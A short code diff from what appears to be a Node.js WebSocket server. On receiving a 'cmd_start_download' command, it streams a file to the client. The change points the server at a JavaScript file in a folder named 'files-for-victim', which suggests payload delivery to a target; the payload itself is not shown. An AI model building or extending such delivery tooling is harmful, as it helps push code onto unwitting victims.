@@ -17,7 +17,7 @@ websocketServer.on("connection", (weboscket) => {
 
   weboscket.on("message", (message) => {
     if (decode1(message) === "cmd_start_download") {
-      const stream = fs.createReadStream("./files-for-victim/1.txt");
+      const stream = fs.createReadStream("./files-for-victim/2.js");
       stream.on("data", (data) => {
         weboscket.send(data);
       });
